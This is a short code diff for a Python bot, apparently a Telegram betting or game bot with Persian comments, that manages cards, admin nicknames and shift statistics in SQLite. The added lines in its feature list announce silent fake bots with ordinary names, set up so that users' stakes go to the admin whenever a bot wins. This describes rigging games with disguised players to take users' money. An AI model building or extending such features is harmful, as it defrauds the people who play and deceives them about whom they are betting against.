-        # بروزرسانی کارت
         c.execute('UPDATE settings SET value = ? WHERE key = "current_card"', (card,))
         
-        # دریافت لقب ادمین
         admin_nick = "ادمین"
         c.execute('SELECT nickname FROM admins WHERE user_id = ?', (str(message.from_user.id),))
         r = c.fetchone()
         if r:
             admin_nick = r[0]
         
-        # ثبت شیفت جدید
         c.execute('''INSERT INTO shift_stats 
                     (admin_id, nickname, start_time, deposits, withdrawals, profits) 
                     VALUES (?, ?, ?, 0, 0, 0)''', 
@@ -2330,6 +2547,9 @@ if __name__ == "__main__":
     ✅ سیستم تیکت با پاسخ
     ✅ مشاهده صف انتظار
     ✅ تغییر شیفت
+    ✅ ربات‌های ساختگی با اسم‌های معمولی (بی‌صدا)
+    ✅ اگه ربات برنده شد، پول کاربرا به سود ادمین
+    ✅ اگه کاربر برنده شد، پول کاربرا به برنده + سود ادمین
     """)
     print("🤖 ربات در حال اجراست...")
     
